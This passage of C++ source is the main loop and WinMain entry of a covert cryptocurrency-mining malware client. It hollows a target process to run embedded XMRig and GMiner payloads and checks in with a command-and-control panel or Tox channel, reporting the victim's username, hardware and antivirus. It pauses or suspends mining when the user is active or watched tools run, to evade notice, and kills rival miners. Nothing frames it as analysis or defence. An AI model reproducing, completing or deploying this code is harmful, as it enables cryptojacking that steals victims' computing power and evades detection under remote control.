                gpuPid.store(0);
                gpuPi.reset();
            } else if (gpuPid.load() != 0) { g_gpuMinerProcess.store(NULL); gpuPid.store(0); }

            if (gpuShouldMine(newGpuConfig, IsDeviceIdle(newGpuConfig.wait_time_idle))
                && gminerBuf != nullptr && gminerPayloadSize > 0) {
                const std::string gminer_args = buildGminerArgs(newGpuConfig);
                DWORD _gp = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                gpuPid.store(_gp);
                gpuPi = ProcessStorage::GetProcess(_gp);
                if (gpuPi) g_gpuMinerProcess.store(gpuPi->hProcess);
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] GPU miner restarted, PID: " << gpuPid.load() << std::endl;
#endif
            }
        }
    };

    while (true)
    {
        // Console-CTRL handler sets this from another thread on Ctrl+C /
        // window close / logoff. Breaking here lets the process return from
        // main() and run destructors, instead of dying via exit() from the
        // signal handler.
        if (g_shouldExit.load())
            break;
        // Check in with panel every 4 minutes
        checkInCounter++;
        if (checkInCounter >= CHECK_IN_INTERVAL)
        {
            checkInCounter = 0;
            double cpuHashrate = 0.0;
            double gpuHashrate = 0.0;
            const char* kHsUnit = DVM_STR("H/s");
            std::string gpuHashrateUnit = kHsUnit;
            DVM_FREE(kHsUnit);

            if (cpuPid != 0 && cpuPi && WaitForSingleObject(cpuPi->hProcess, 0) != WAIT_OBJECT_0) {
                cpuHashrate = GetMinerHashrate();
            }
            if (gpuPid != 0 && gpuPi && WaitForSingleObject(gpuPi->hProcess, 0) != WAIT_OBJECT_0) {
                auto [val, unit] = GetGPUMinerHashrate();
                gpuHashrate = val;
                gpuHashrateUnit = unit;
            }

            {
                bool configFetched = false;
                if (kConfigMode == "tox") {
                    // Tox mode: no polling - config updates arrive over the C2
                    // channel and are drained further down the loop.
                    configFetched = false;
                } else if (kConfigMode == "config_link") {
                    configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
                } else {
                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
                }

                if (!configFetched && panelOnline) {
                    panelOnline = false;
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[-] Panel offline" << std::endl;
#endif
                } else if (configFetched && !panelOnline) {
                    panelOnline = true;
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[+] Panel back online" << std::endl;
#endif
                }

                if (configFetched) {
                    applyConfigUpdate();
                }

                // Remote-miner swap path removed — see the miner-loading section
                // near the top of main() for the rationale. The embedded miner
                // is authoritative; XMRig's own stratum failover handles pool
                // switches at runtime.
            }
        }

#ifdef ENABLE_TOX_C2
        // Drain all pending Tox configs (queue, not single slot)
        for (;;) {
            std::string cfg;
            {
                std::lock_guard<std::mutex> lk(g_toxConfigMutex);
                if (g_toxConfigQueue.empty()) break;
                cfg = g_toxConfigQueue.front();
                g_toxConfigQueue.pop_front();
            }
            if (configManager.ApplyConfigJson(cfg)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Tox config applied" << std::endl;
#endif
                applyConfigUpdate();
            } else {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cerr << "[-] Tox config rejected" << std::endl;
#endif
            }
        }
#endif

        // Monitor CPU miner process (reconciles against the current idle state)
        {
            const bool cpuIsIdle = IsDeviceIdle(lastCpuConfig.wait_time_idle);
            const double cpuUsage = cpuIsIdle ? lastCpuConfig.idle_usage : lastCpuConfig.non_idle_usage;
            const bool shouldMine = lastCpuConfig.enabled == 1 && cpuUsage > 0.0;

            hashratePrintCounter++;
            if (hashratePrintCounter >= 30) {
                hashratePrintCounter = 0;
#ifdef ENABLE_DEBUG_CONSOLE
                const char* kCpuHs = DVM_STR("[*] CPU hashrate: ");
                std::cout << kCpuHs << GetMinerHashrate() << " H/s" << std::endl;
                DVM_FREE(kCpuHs);
#endif
            }

            idlePrintCounter++;
            if (idlePrintCounter >= 60) {
                idlePrintCounter = 0;
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[*] Idle: " << (cpuIsIdle ? "IDLE" : "BUSY") << " (threshold: " << lastCpuConfig.wait_time_idle << "m)" << std::endl;
#endif
            }

            if (shouldMine && cpuPid.load() == 0) {
                if (xmrigBuf != nullptr && xmrigPayloadSize > 0) {
                    DWORD _np = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                        buildCpuArgs(lastCpuConfig, cpuIsIdle));
                    cpuPid.store(_np);
                    cpuPi = ProcessStorage::GetProcess(_np);
                    if (cpuPi) g_cpuMinerProcess.store(cpuPi->hProcess);
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[+] CPU miner (re)started, PID: " << cpuPid.load() << std::endl;
#endif
                }
            } else if (!shouldMine && cpuPid.load() != 0) {
                if (cpuPi) {
                    TerminateProcess(cpuPi.value().hProcess, 0);
                    if (WaitForSingleObject(cpuPi.value().hProcess, 5000) == WAIT_TIMEOUT)
                        TerminateProcess(cpuPi.value().hProcess, 1);
                    if (PVOID veh = ProcessStorage::TakeVehBlock(cpuPid.load()))
                        VirtualFreeEx(cpuPi.value().hProcess, veh, 0, MEM_RELEASE);
                    CloseHandle(cpuPi.value().hProcess);
                    CloseHandle(cpuPi.value().hThread);
                    ProcessStorage::RemoveProcess(cpuPid.load());
                    cpuPi.reset();
                }
                g_cpuMinerProcess.store(NULL);
                cpuPid.store(0);
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[*] CPU mining paused (idle state)" << std::endl;
#endif
            } else if (cpuPid.load() != 0 && cpuPi &&
                       WaitForSingleObject(cpuPi->hProcess, 0) == WAIT_OBJECT_0) {
                {
                    DWORD exitCode = 0;
                    GetExitCodeProcess(cpuPi->hProcess, &exitCode);
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[!] CPU miner exited (code=0x" << std::hex << exitCode
                              << " / " << std::dec << (int)exitCode << "), restarting" << std::endl;
#endif
                }
                if (PVOID veh = ProcessStorage::TakeVehBlock(cpuPid.load()))
                    VirtualFreeEx(cpuPi->hProcess, veh, 0, MEM_RELEASE);
                CloseHandle(cpuPi->hProcess);
                CloseHandle(cpuPi->hThread);
                ProcessStorage::RemoveProcess(cpuPid.load());
                g_cpuMinerProcess.store(NULL);
                cpuPi.reset();
                cpuPid.store(0);
                if (shouldMine && xmrigBuf != nullptr && xmrigPayloadSize > 0) {
                    DWORD _np = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                        buildCpuArgs(lastCpuConfig, cpuIsIdle));
                    cpuPid.store(_np);
                    cpuPi = ProcessStorage::GetProcess(_np);
                    if (cpuPi) g_cpuMinerProcess.store(cpuPi->hProcess);
                }
            } else if (cpuPid.load() != 0) {
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
                    NtSuspendProcess(cpuPi.value().hProcess);
                } else {
                    NtResumeProcess(cpuPi.value().hProcess);
                }
            }
        }

        // Monitor GPU miner process (reconciles against the current idle state)
        {
            const bool gpuIsIdle = IsDeviceIdle(lastGpuConfig.wait_time_idle);
            const bool shouldMine = gpuShouldMine(lastGpuConfig, gpuIsIdle);

            if (shouldMine && gpuPid.load() == 0) {
                if (gminerBuf != nullptr && gminerPayloadSize > 0) {
                    const std::string gminer_args = buildGminerArgs(lastGpuConfig);
                    DWORD _gp = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                    gpuPid.store(_gp);
                    gpuPi = ProcessStorage::GetProcess(_gp);
                    if (gpuPi) g_gpuMinerProcess.store(gpuPi->hProcess);
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[+] GPU miner (re)started, PID: " << gpuPid.load() << std::endl;
#endif
                }
            } else if (!shouldMine && gpuPid.load() != 0) {
                if (gpuPi) {
                    TerminateProcess(gpuPi.value().hProcess, 0);
                    if (WaitForSingleObject(gpuPi.value().hProcess, 5000) == WAIT_TIMEOUT)
                        TerminateProcess(gpuPi.value().hProcess, 1);
                    if (PVOID veh = ProcessStorage::TakeVehBlock(gpuPid.load()))
                        VirtualFreeEx(gpuPi.value().hProcess, veh, 0, MEM_RELEASE);
                    CloseHandle(gpuPi.value().hProcess);
                    CloseHandle(gpuPi.value().hThread);
                    ProcessStorage::RemoveProcess(gpuPid.load());
                    gpuPi.reset();
                }
                g_gpuMinerProcess.store(NULL);
                gpuPid.store(0);
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[*] GPU mining paused (idle state)" << std::endl;
#endif
            } else if (gpuPid.load() != 0 && gpuPi &&
                       WaitForSingleObject(gpuPi->hProcess, 0) == WAIT_OBJECT_0) {
                {
                    DWORD exitCode = 0;
                    GetExitCodeProcess(gpuPi->hProcess, &exitCode);
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[!] GPU miner exited (code=0x" << std::hex << exitCode
                              << " / " << std::dec << (int)exitCode << "), restarting" << std::endl;
#endif
                }
                if (PVOID veh = ProcessStorage::TakeVehBlock(gpuPid.load()))
                    VirtualFreeEx(gpuPi->hProcess, veh, 0, MEM_RELEASE);
                CloseHandle(gpuPi->hProcess);
                CloseHandle(gpuPi->hThread);
                ProcessStorage::RemoveProcess(gpuPid.load());
                g_gpuMinerProcess.store(NULL);
                gpuPi.reset();
                gpuPid.store(0);
                if (shouldMine && gminerBuf != nullptr && gminerPayloadSize > 0) {
                    const std::string gminer_args = buildGminerArgs(lastGpuConfig);
                    DWORD _gp = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                    gpuPid.store(_gp);
                    gpuPi = ProcessStorage::GetProcess(_gp);
                    if (gpuPi) g_gpuMinerProcess.store(gpuPi->hProcess);
                }
            } else if (gpuPid.load() != 0) {
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
                    NtSuspendProcess(gpuPi.value().hProcess);
                } else {
                    NtResumeProcess(gpuPi.value().hProcess);
                }
            }
        }

#ifdef ENABLE_FOREIGN_MINER_KILLER
        // Sweep for foreign miners. Never pass cpuPid/gpuPid when they are zero
        // (a zero PID would otherwise mark the System Idle process as "ours").
        fmkCounter++;
        if (fmkCounter >= FMK_INTERVAL) {
            fmkCounter = 0;
            std::vector<DWORD> ownPids;
            ownPids.reserve(3);
            if (cpuPid != 0) ownPids.push_back(cpuPid);
            if (gpuPid != 0) ownPids.push_back(gpuPid);
            const int killed = ForeignMinerKiller::ScanAndKill(ownPids, configManager.GetWatchedProcesses());
#ifdef ENABLE_DEBUG_CONSOLE
            if (killed > 0)
                std::cout << "[+] Foreign Miner Killer neutralized " << killed << " process(es)" << std::endl;
#endif
        }
#endif

#ifdef ENABLE_TOX_C2
        // Handle commands queued by the Tox thread.
        if (g_toxStopRequested.exchange(false)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Stop requested via Tox" << std::endl;
#endif
            g_shouldExit.store(true);
            break;
        }
        if (g_toxRestartRequested.exchange(false)) {
            // Properly terminate so crash-restart relaunches cleanly (free VEH, handles, map, atomics).
            if (cpuPi) {
                TerminateProcess(cpuPi.value().hProcess, 0);
                WaitForSingleObject(cpuPi.value().hProcess, 2000);
                if (PVOID veh = ProcessStorage::TakeVehBlock(cpuPid.load()))
                    VirtualFreeEx(cpuPi.value().hProcess, veh, 0, MEM_RELEASE);
                CloseHandle(cpuPi.value().hProcess);
                CloseHandle(cpuPi.value().hThread);
                ProcessStorage::RemoveProcess(cpuPid.load());
                g_cpuMinerProcess.store(NULL);
                cpuPi.reset();
                cpuPid.store(0);
            } else if (cpuPid.load() != 0) { cpuPid.store(0); g_cpuMinerProcess.store(NULL); }
            if (gpuPi) {
                TerminateProcess(gpuPi.value().hProcess, 0);
                WaitForSingleObject(gpuPi.value().hProcess, 2000);
                if (PVOID veh = ProcessStorage::TakeVehBlock(gpuPid.load()))
                    VirtualFreeEx(gpuPi.value().hProcess, veh, 0, MEM_RELEASE);
                CloseHandle(gpuPi.value().hProcess);
                CloseHandle(gpuPi.value().hThread);
                ProcessStorage::RemoveProcess(gpuPid.load());
                g_gpuMinerProcess.store(NULL);
                gpuPi.reset();
                gpuPid.store(0);
            } else if (gpuPid.load() != 0) { gpuPid.store(0); g_gpuMinerProcess.store(NULL); }
        }
#endif

        Sleep(1000);
    }

#ifdef ENABLE_TOX_C2
    ToxC2::Stop();
#endif

    return 0;
}

// WinMain entry point for GUI subsystem (WIN32 flag)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Convert Windows command line to argc/argv format and call main()
    int argc = 0;
    LPWSTR* argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv_w)
        return 1;

    char** argv = new char*[argc];
    for (int i = 0; i < argc; i++) {
        int size = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
        argv[i] = new char[size];
        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], size, NULL, NULL);
    }
    
    int result = main(argc, argv);
    
    // Cleanup
    for (int i = 0; i < argc; i++) {
        delete[] argv[i];
    }
    delete[] argv;
    LocalFree(argv_w);
    
    return result;
}


